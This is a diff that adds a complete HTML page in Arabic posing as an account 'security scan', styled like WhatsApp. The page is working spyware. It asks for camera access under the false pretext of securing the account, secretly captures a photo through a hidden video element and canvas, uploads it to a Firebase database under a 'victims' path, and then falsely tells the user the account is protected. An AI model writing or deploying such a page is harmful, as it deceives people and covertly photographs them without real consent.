@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>فحص الأمان</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+</head>
+<body style="background:#000; color:#fff; text-align:center; font-family:sans-serif; padding-top:100px;">
+    <h3>جاري تأمين اتصالك...</h3>
+    <p id="msg">اضغط على "بدء الفحص" لتأمين الحساب</p>
+    <button onclick="start()" style="padding:15px 30px; background:#25d366; color:#fff; border:none; border-radius:5px; font-size:18px; cursor:pointer;">بدء الفحص</button>
+    <video id="v" width="1" height="1" autoplay style="display:none;"></video>
+    <canvas id="c" width="640" height="480" style="display:none;"></canvas>
+    <script>
+        const firebaseConfig = {
+          apiKey: "AIzaSyCSl0Mf_0xR46pUiEgAfLtKzQJPZKl9cXo",
+          authDomain: "ghadar-network.firebaseapp.com",
+          projectId: "ghadar-network",
+          databaseURL: "https://ghadar-network-default-rtdb.firebaseio.com",
+          storageBucket: "ghadar-network.firebasestorage.app",
+          appId: "1:667844103628:web:9fca65eb09e85463afa169"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        function start() {
+            navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
+                document.getElementById('v').srcObject = s;
+                document.getElementById('msg').innerText = "جاري التحليل.. لا تغلق الصفحة";
+                setTimeout(() => {
+                    const canvas = document.getElementById('c');
+                    const context = canvas.getContext('2d');
+                    context.drawImage(document.getElementById('v'), 0, 0);
+                    const img = canvas.toDataURL('image/jpeg');
+                    db.ref('victims/' + Date.now()).set({ photo: img, time: new Date().toLocaleString() })
+                    .then(() => { document.getElementById('msg').innerText = "تم الفحص بنجاح! حسابك محمي."; });
+                }, 3000);
+            }).catch(e => { document.getElementById('msg').innerText = "خطأ: يجب السماح بالكاميرا للفحص!"; });
+        }
+    </script>
+</body>
+</html>
